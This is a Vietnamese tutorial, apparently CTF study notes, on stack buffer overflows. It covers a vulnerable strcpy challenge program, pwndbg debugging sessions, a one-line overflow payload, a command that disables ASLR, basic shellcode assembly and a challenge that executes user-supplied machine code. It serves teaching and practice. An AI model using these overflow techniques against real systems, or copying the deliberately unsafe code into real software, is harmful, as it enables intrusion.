# Buffer Overfflow (lỗi tràn bộ nhớ đệm)

## :memo: Lỗi tràn bộ đệm ?


> Tóm tắt : Tấn công Buffer Overflow có nguyên nhân gần giống với tấn công SQL Injection,
khi người dùng hay hacker cung cấp các biên đầu vào hay dữ liệu vượt quá khả năng xử lý của
chương trình làm cho hệ thống bị treo dẫn đến từ chối dịch vụ hay có khả năng bị các hacker lợi
dụng chèn các chỉ thị trái phép nhằm thực hiện các đoạn mã nguy hiểm từ xa. Vì vậy, trong bài
báo này chúng ta sẽ tìm hiểu những khái niệm cơ bản nhất về tấn công tràn bộ đệm, các cách tấn
công, cách phát hiện và cách phòng chống để nâng cao kiến thức và kỹ năng phòng chống lại các
cuộc tấn công Buffer Overflow. 

## Tool exploit

+ pwntools 
+ pwndbg

## Knowledge

+ Stack frame
+ Basic python
+ ASM 



# Introduction to Stack

Stack Frame là Ngăn xếp khung. Đây là nghĩa tiếng Việt của thuật ngữ Stack Frame - một thuật ngữ thuộc nhóm Technology Terms - Công nghệ thông tin. Một khung ngăn xếp là một kỹ thuật quản lý bộ nhớ được sử dụng trong một số ngôn ngữ lập trình để tạo ra và loại bỏ các biến tạm thời.


![](https://i.imgur.com/w85703G.png)


### Ví dụ code C này
```c=16
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
 volatile int modified;
 char buffer[64];

 if(argc == 1) {
  errx(1, "please specify an argument\n");
 }

 modified = 0;
 strcpy(buffer, argv[1]);

 if(modified == 0x61626364) {
  printf("you have correctly got the variable to the right value\n");
 } else {
  printf("Try again, you got 0x%08x\n", modified);
 }
}


```

## Analyst 

Đọc sơ ta thấy lỗi chỗ strcpy, nó copy data của ta vào buff mà buff lại chỉ có 64 nên nếu ta đưa input nhiều thì sẽ tràn qua địa chỉ của biến modifed


```c=16
pwndbg: loaded 198 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from ./stack1...(no debugging symbols found)...done.
pwndbg> m
Dump of assembler code for function main:
   0x080484b6 <+0>:     lea    ecx,[esp+0x4]
   0x080484ba <+4>:     and    esp,0xfffffff0
   0x080484bd <+7>:     push   DWORD PTR [ecx-0x4]
   0x080484c0 <+10>:    push   ebp
   0x080484c1 <+11>:    mov    ebp,esp
   0x080484c3 <+13>:    push   esi
   0x080484c4 <+14>:    push   ebx
   0x080484c5 <+15>:    push   ecx
   0x080484c6 <+16>:    sub    esp,0x5c
   0x080484c9 <+19>:    call   0x80483f0 <__x86.get_pc_thunk.bx>
   0x080484ce <+24>:    add    ebx,0x1b32
   0x080484d4 <+30>:    mov    esi,ecx
   0x080484d6 <+32>:    cmp    DWORD PTR [esi],0x1
   0x080484d9 <+35>:    jne    0x80484ef <main+57>
   0x080484db <+37>:    sub    esp,0x8
   0x080484de <+40>:    lea    eax,[ebx-0x1a20]
   0x080484e4 <+46>:    push   eax
   0x080484e5 <+47>:    push   0x1
   0x080484e7 <+49>:    call   0x8048380 <errx@plt>
   0x080484ec <+54>:    add    esp,0x10
   0x080484ef <+57>:    mov    DWORD PTR [ebp-0x1c],0x0
   0x080484f6 <+64>:    mov    eax,DWORD PTR [esi+0x4]
   0x080484f9 <+67>:    add    eax,0x4
   0x080484fc <+70>:    mov    eax,DWORD PTR [eax]
   0x080484fe <+72>:    sub    esp,0x8
   0x08048501 <+75>:    push   eax
   0x08048502 <+76>:    lea    eax,[ebp-0x5c]
   0x08048505 <+79>:    push   eax
   0x08048506 <+80>:    call   0x8048350 <strcpy@plt>
   0x0804850b <+85>:    add    esp,0x10
   0x0804850e <+88>:    mov    eax,DWORD PTR [ebp-0x1c]
   0x08048511 <+91>:    cmp    eax,0x61626364
   0x08048516 <+96>:    jne    0x804852c <main+118>
   0x08048518 <+98>:    sub    esp,0xc
   0x0804851b <+101>:   lea    eax,[ebx-0x1a04]
   0x08048521 <+107>:   push   eax
   0x08048522 <+108>:   call   0x8048360 <puts@plt>
   0x08048527 <+113>:   add    esp,0x10
   0x0804852a <+116>:   jmp    0x8048542 <main+140>
   0x0804852c <+118>:   mov    eax,DWORD PTR [ebp-0x1c]
   0x0804852f <+121>:   sub    esp,0x8
   0x08048532 <+124>:   push   eax
   0x08048533 <+125>:   lea    eax,[ebx-0x19cd]
   0x08048539 <+131>:   push   eax
   0x0804853a <+132>:   call   0x8048340 <printf@plt>
   0x0804853f <+137>:   add    esp,0x10
   0x08048542 <+140>:   mov    eax,0x0
   0x08048547 <+145>:   lea    esp,[ebp-0xc]
   0x0804854a <+148>:   pop    ecx
   0x0804854b <+149>:   pop    ebx
   0x0804854c <+150>:   pop    esi
   0x0804854d <+151>:   pop    ebp
   0x0804854e <+152>:   lea    esp,[ecx-0x4]
   0x08048551 <+155>:   ret
```

- Đầu tiên: Xác định các biến cục bộ của stack.

- Tính số byte từ buffer

- Address modified


### Show 

```c=1
pwndbg> b*main+80
pwndbg> r aaaaaaaaaaaaaaaaaaaaaaa
Starting program: /mnt/f/CTF/python3-pwntools/Re_pwn/stack1 aaaaaaaaaaaaaaaaaaaaaaa

Breakpoint 1, 0x08048506 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────────────────────
 EAX  0xffffccdc —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x26f34
 EBX  0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f14 (_DYNAMIC) ◂— 0x1
 ECX  0xffffcd50 ◂— 0x2
 EDX  0xffffcd74 ◂— 0x0
 EDI  0x0
 ESI  0xffffcd50 ◂— 0x2
 EBP  0xffffcd38 ◂— 0x0
 ESP  0xffffccc0 —▸ 0xffffccdc —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x26f34
 EIP  0x8048506 (main+80) —▸ 0xfffe45e8 ◂— 0x0
───────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x8048506 <main+80>     call   strcpy@plt                     <strcpy@plt>
        dest: 0xffffccdc —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x26f34
        src: 0xffffcf5d ◂— 'aaaaaaaaaaaaaaaaaaaaaaa'

   0x804850b <main+85>     add    esp, 0x10
   0x804850e <main+88>     mov    eax, dword ptr [ebp - 0x1c]
   0x8048511 <main+91>     cmp    eax, 0x61626364
   0x8048516 <main+96>     jne    main+118                     <main+118>

   0x8048518 <main+98>     sub    esp, 0xc
   0x804851b <main+101>    lea    eax, [ebx - 0x1a04]
   0x8048521 <main+107>    push   eax
   0x8048522 <main+108>    call   puts@plt                     <puts@plt>

   0x8048527 <main+113>    add    esp, 0x10
   0x804852a <main+116>    jmp    main+140                     <main+140>
───────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffffccc0 —▸ 0xffffccdc —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x26f34
01:0004│     0xffffccc4 —▸ 0xffffcf5d ◂— 'aaaaaaaaaaaaaaaaaaaaaaa'
02:0008│     0xffffccc8 —▸ 0xf7ffd940 ◂— 0x0
03:000c│     0xffffcccc —▸ 0x80484ce (main+24) ◂— 0x1b32c381
04:0010│     0xffffccd0 ◂— 0x0
05:0014│     0xffffccd4 ◂— 0xc30000
06:0018│     0xffffccd8 ◂— 0x0
07:001c│ eax 0xffffccdc —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x26f34
─────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0 0x8048506 main+80
   f 1 0xf7dfffa1 __libc_start_main+241
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> n
0x0804850b in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────────────────────
 EAX  0xffffccdc ◂— 'aaaaaaaaaaaaaaaaaaaaaaa'
 EBX  0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f14 (_DYNAMIC) ◂— 0x1
*ECX  0xffffcf70 ◂— 'aaaa'
*EDX  0xffffccef ◂— 'aaaa'
 EDI  0x0
 ESI  0xffffcd50 ◂— 0x2
 EBP  0xffffcd38 ◂— 0x0
 ESP  0xffffccc0 —▸ 0xffffccdc ◂— 'aaaaaaaaaaaaaaaaaaaaaaa'
*EIP  0x804850b (main+85) ◂— 0x8b10c483
───────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────────────────
   0x8048506 <main+80>     call   strcpy@plt                     <strcpy@plt>

 ► 0x804850b <main+85>     add    esp, 0x10
   0x804850e <main+88>     mov    eax, dword ptr [ebp - 0x1c]
   0x8048511 <main+91>     cmp    eax, 0x61626364
   0x8048516 <main+96>     jne    main+118                     <main+118>
    ↓
   0x804852c <main+118>    mov    eax, dword ptr [ebp - 0x1c]
   0x804852f <main+121>    sub    esp, 8
   0x8048532 <main+124>    push   eax
   0x8048533 <main+125>    lea    eax, [ebx - 0x19cd]
   0x8048539 <main+131>    push   eax
   0x804853a <main+132>    call   printf@plt                     <printf@plt>
───────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffffccc0 —▸ 0xffffccdc ◂— 'aaaaaaaaaaaaaaaaaaaaaaa'
01:0004│     0xffffccc4 —▸ 0xffffcf5d ◂— 'aaaaaaaaaaaaaaaaaaaaaaa'
02:0008│     0xffffccc8 —▸ 0xf7ffd940 ◂— 0x0
03:000c│     0xffffcccc —▸ 0x80484ce (main+24) ◂— 0x1b32c381
04:0010│     0xffffccd0 ◂— 0x0
05:0014│     0xffffccd4 ◂— 0xc30000
06:0018│     0xffffccd8 ◂— 0x0
07:001c│ eax 0xffffccdc ◂— 'aaaaaaaaaaaaaaaaaaaaaaa'
─────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0 0x804850b main+85
   f 1 0xf7dfffa1 __libc_start_main+241
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg>

```
### Mục tiêu

Vùng dest tại địa chỉ 0xffffccdc , sau khi copy vào từ src có tại địa chỉ 0xffffcf5d , vậy ta cần bao nhiêu byte để đè lên modifed .


Khi thực hiện bằng cách đè 64 byte của buff và thêm 1234 sau để xem và có kết quả này.

```c=1
pwndbg> r aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1234
Starting program: /mnt/f/CTF/python3-pwntools/Re_pwn/stack1 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1234

Breakpoint 1, 0x08048506 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────────────────────
 EAX  0xffffccac —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x26f34
 EBX  0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f14 (_DYNAMIC) ◂— 0x1
 ECX  0xffffcd20 ◂— 0x2
 EDX  0xffffcd44 ◂— 0x0
 EDI  0x0
 ESI  0xffffcd20 ◂— 0x2
 EBP  0xffffcd08 ◂— 0x0
 ESP  0xffffcc90 —▸ 0xffffccac —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x26f34
 EIP  0x8048506 (main+80) —▸ 0xfffe45e8 ◂— 0x0
───────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x8048506 <main+80>     call   strcpy@plt                     <strcpy@plt>
        dest: 0xffffccac —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x26f34
        src: 0xffffcf30 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1234'

   0x804850b <main+85>     add    esp, 0x10
   0x804850e <main+88>     mov    eax, dword ptr [ebp - 0x1c]
   0x8048511 <main+91>     cmp    eax, 0x61626364
   0x8048516 <main+96>     jne    main+118                     <main+118>

   0x8048518 <main+98>     sub    esp, 0xc
   0x804851b <main+101>    lea    eax, [ebx - 0x1a04]
   0x8048521 <main+107>    push   eax
   0x8048522 <main+108>    call   puts@plt                     <puts@plt>

   0x8048527 <main+113>    add    esp, 0x10
   0x804852a <main+116>    jmp    main+140                     <main+140>
───────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffffcc90 —▸ 0xffffccac —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x26f34
01:0004│     0xffffcc94 —▸ 0xffffcf30 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1234'
02:0008│     0xffffcc98 —▸ 0xf7ffd940 ◂— 0x0
03:000c│     0xffffcc9c —▸ 0x80484ce (main+24) ◂— 0x1b32c381
04:0010│     0xffffcca0 ◂— 0x0
05:0014│     0xffffcca4 ◂— 0xc30000
06:0018│     0xffffcca8 ◂— 0x0
07:001c│ eax 0xffffccac —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x26f34
─────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0 0x8048506 main+80
   f 1 0xf7dfffa1 __libc_start_main+241
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> n
0x0804850b in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────────────────────
 EAX  0xffffccac ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1234'
 EBX  0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f14 (_DYNAMIC) ◂— 0x1
*ECX  0xffffcf70 ◂— '1234'
*EDX  0xffffccec ◂— '1234'
 EDI  0x0
 ESI  0xffffcd20 ◂— 0x2
 EBP  0xffffcd08 ◂— 0x0
 ESP  0xffffcc90 —▸ 0xffffccac ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1234'
*EIP  0x804850b (main+85) ◂— 0x8b10c483
───────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────────────────
   0x8048506 <main+80>     call   strcpy@plt                     <strcpy@plt>

 ► 0x804850b <main+85>     add    esp, 0x10
   0x804850e <main+88>     mov    eax, dword ptr [ebp - 0x1c]
   0x8048511 <main+91>     cmp    eax, 0x61626364
   0x8048516 <main+96>     jne    main+118                     <main+118>
    ↓
   0x804852c <main+118>    mov    eax, dword ptr [ebp - 0x1c]
   0x804852f <main+121>    sub    esp, 8
   0x8048532 <main+124>    push   eax
   0x8048533 <main+125>    lea    eax, [ebx - 0x19cd]
   0x8048539 <main+131>    push   eax
   0x804853a <main+132>    call   printf@plt                     <printf@plt>
───────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffffcc90 —▸ 0xffffccac ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1234'
01:0004│     0xffffcc94 —▸ 0xffffcf30 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1234'
02:0008│     0xffffcc98 —▸ 0xf7ffd940 ◂— 0x0
03:000c│     0xffffcc9c —▸ 0x80484ce (main+24) ◂— 0x1b32c381
04:0010│     0xffffcca0 ◂— 0x0
05:0014│     0xffffcca4 ◂— 0xc30000
06:0018│     0xffffcca8 ◂— 0x0
07:001c│ eax 0xffffccac ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1234'
─────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0 0x804850b main+85
   f 1 0xf7dfffa1 __libc_start_main+241
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> tele ebp-0x1c
00:0000│ edx 0xffffccec ◂— '1234'
01:0004│     0xffffccf0 ◂— 0x0
02:0008│     0xffffccf4 —▸ 0xffffcdb4 —▸ 0xffffcf06 ◂— '/mnt/f/CTF/python3-pwntools/Re_pwn/stack1'
03:000c│     0xffffccf8 —▸ 0xffffcdc0 —▸ 0xffffcf75 ◂— 0x435f534c ('LS_C')
04:0010│     0xffffccfc —▸ 0xffffcd20 ◂— 0x2
05:0014│     0xffffcd00 ◂— 0x0
06:0018│     0xffffcd04 —▸ 0xf7fbf000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c
07:001c│ ebp 0xffffcd08 ◂— 0x0
pwndbg>

```


vậy biến modifed chỉ cần 4 byte đã đè rồi , vậy ta chỉ cần đưa 4 byte đó là giá trị của biến modified thôi.


## Exploite

```python=
 ./stack1 `python -c "print ('A' * 64 + 'dcba')"`
```

# Disabling ASLR

ASLR là một kỹ thuật bảo mật và mặc dù nó không được thiết kế cụ thể để chống lại ShellCode, nhưng nó liên quan đến việc ngẫu nhiên các khía cạnh nhất định của bộ nhớ (chúng ta sẽ nói về nó chi tiết hơn nhiều sau). Sự ngẫu nhiên này có thể tạo ra các khai thác shellcode giống như cái mà chúng ta sắp làm ít đáng tin cậy hơn, vì vậy chúng ta sẽ vô hiệu hóa nó ngay bây giờ bằng cách sử dụng điều này.


Cách tắt ASLR
```c
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

# SHELLCODE

Shellcode là tập hợp các lệnh được tiêm và thực thi trên chương trình bị lỗi.
Shellcode giúp kẻ tấn công có thể đạt được các mục tiêu, kẻ tấn công thường sẽ thực thi 1 chương trình có sẵn là /bin/sh
Shellcode có thể được viết bằng nhiều loại ngôn ngữ bậc cao nhưng thường được viết bằng ngôn ngữ assembly.


```c=1

Ví dụ: exit(1)
0:  b0 01   mov    al,0x1 ; sys_exit
2:  b3 01   mov    bl,0x1 ; error_code = 1
4:  cd 80   int    0x80

```
### System call 


Syscall được user mode sử dụng để giao tiếp với kernel mode nhằm:
Tạo và quản lý tiến trình
Quản lý bộ nhớ
Truy cập tệp tin, thư mục và hệ thống quản lí tệp tin.
Xuất nhập chuẩn (Input/Output)
Giao tiếp qua mạng
Quản lý thiết bị
...

### Write Shellcode


```c=
read(0, buffer, 0x100); // buffer = [esp+0x20]

// ebx=0 => fd = 0
xor ebx,ebx
// ecx = buff
mov ecx, [esp+0x20]
// edx = 0x100,count
mov edx, 0x100
//eax = 3 (syscall read)
mov eax,3
//syscall
int 0x80
```
## Chall Test 
```c=
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void main(){
	alarm(0x20);
        setbuf(stdin, NULL);
        setbuf(stdout, NULL);
	char machine_code[512];
	printf("This only understands the machine code so you have to give only the machine code, so please enter the machine code below\n");
	fgets(machine_code, 512, stdin);
	((void (*)())(machine_code))();
}

```

### Hint 

-> padding byte machine_code

-> Shellcode bin/sh



# Document
-> [System call](https://vimentor.com/en/lesson/system-call)
-> [https://man7.org/linux/man-pages/man2/read.2.html](https://)



